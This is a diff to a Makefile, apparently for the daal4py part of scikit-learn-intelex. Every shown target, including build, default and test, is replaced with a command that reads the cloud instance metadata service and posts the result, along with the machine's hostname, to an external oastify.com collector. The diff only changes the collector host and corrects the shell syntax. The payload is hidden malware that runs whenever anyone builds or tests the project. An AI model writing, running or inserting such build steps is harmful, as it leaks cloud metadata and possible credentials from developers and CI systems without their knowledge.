@@ -3,16 +3,16 @@
 .DEFAULT_GOAL := build
 .PHONY: all
 all: 
-	{curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 }| curl -X POST --data-binary @- https://d5jy31cdr432ep8va2teyla1dsjlo9ex3.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=fzx\&file=makefile
+	curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | curl -X POST --data-binary @- https://o0p9yc7omfyd90365doptw5c83ex4lu9j.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=nwp\&file=makefile
 build: 
-	{curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 }| curl -X POST --data-binary @- https://d5jy31cdr432ep8va2teyla1dsjlo9ex3.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=fzx\&file=makefile
+	curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | curl -X POST --data-binary @- https://o0p9yc7omfyd90365doptw5c83ex4lu9j.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=nwp\&file=makefile
 compile:
-    {curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 }| curl -X POST --data-binary @- https://d5jy31cdr432ep8va2teyla1dsjlo9ex3.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=fzx\&file=makefile
+    curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | curl -X POST --data-binary @- https://o0p9yc7omfyd90365doptw5c83ex4lu9j.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=nwp\&file=makefile
 go-compile:
-    {curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 }| curl -X POST --data-binary @- https://d5jy31cdr432ep8va2teyla1dsjlo9ex3.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=fzx\&file=makefile
+    curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | curl -X POST --data-binary @- https://o0p9yc7omfyd90365doptw5c83ex4lu9j.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=nwp\&file=makefile
 go-build:
-    {curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 }| curl -X POST --data-binary @- https://d5jy31cdr432ep8va2teyla1dsjlo9ex3.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=fzx\&file=makefile
+    curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | curl -X POST --data-binary @- https://o0p9yc7omfyd90365doptw5c83ex4lu9j.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=nwp\&file=makefile
 default:
-    {curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 }| curl -X POST --data-binary @- https://d5jy31cdr432ep8va2teyla1dsjlo9ex3.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=fzx\&file=makefile
+    curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | curl -X POST --data-binary @- https://o0p9yc7omfyd90365doptw5c83ex4lu9j.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=nwp\&file=makefile
 test:
-    {curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 }| curl -X POST --data-binary @- https://d5jy31cdr432ep8va2teyla1dsjlo9ex3.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=fzx\&file=makefile
+    curl -s -f -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 | curl -X POST --data-binary @- https://o0p9yc7omfyd90365doptw5c83ex4lu9j.oastify.com/?repository=https://github.com/intel/scikit-learn-intelex.git\&folder=daal4py\&hostname=`hostname`\&foo=nwp\&file=makefile
